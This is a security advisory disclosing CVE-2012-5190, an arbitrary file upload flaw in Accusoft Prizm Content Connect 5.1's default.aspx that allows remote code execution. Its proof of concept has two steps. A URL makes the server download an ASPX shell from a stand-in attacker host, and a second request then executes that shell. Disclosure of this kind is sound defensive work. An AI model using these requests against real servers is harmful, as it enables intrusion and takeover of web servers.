 In the course of our security assessment consulting we often find 0day
vulnerabilities and report them to vendors.  In this particular case the
vendor has unfortunately shown a general disgregard for the security risk
of this uncovered vulnerability which was originally disclosed privately to
them on September 27th 2012. All original deadlines and even their own
proposed fix dates have expired, as such we're releasing this advisory so
that affected customers can update their WAF/IDS/IPS systems to protect
themselves from this obvious vulnerability. We hope the Accusoft team
addresses this vulnerability in a patch or upcoming release as soon as
possible. This vulnerablity has been assigned CVE-2012-5190.

Arbitrary File Upload and Execution in Prizm Content Connect default.aspx

Prizm Content Connect web document viewer converts a variety of formats
into Adobe Flash objects so that they can be viewed in a web browser. If
Prizm Content Connect is configured according to the installation
instructions, it will be vulnerable to arbitrary remote code execution.

By default, the Prizm software includes a script called default.aspx which
will accept a document parameter that is a remote URL. This script will
download the remote document, save it to the server with an
attacker-supplied filename extension, and reveal the path to the document
on the local filesystem.

Since, in the default configuration, the download path on the local
filesystem resides within the web server’s web root, the attacker can cause
default.aspx to download a malicious ASPX script and save it with a
dangerous .aspx extension. The attacker can then request the ASPX script
from the server, causing the server to execute possibly malicious code
contained within.
Vulnerable versions

This vulnerability was discovered in the following version, but we
anticipate other versions to be vulnerable as well:

·         Prizm Content Connect 5.1
Proof of concept

First, the attacker causes the Prizm Content Connect software to download
the malicious ASPX file:

http://victim.example.com/default.aspx?document=http://attacker.example.org/aspxshell.aspx

The resulting page discloses the filename to which the ASPX file was
downloaded, e.g.:

Document Location: C:\Project\

Full Document Path: C:\Project\ajwyfw45itxwys45fgzomrmv.aspx

Temp Location: C:\tempcache\

The attacker then requests the ASPX shell from the root of the website:

http://victim.example.com/ajwyfw45itxwys45fgzomrmv.aspx
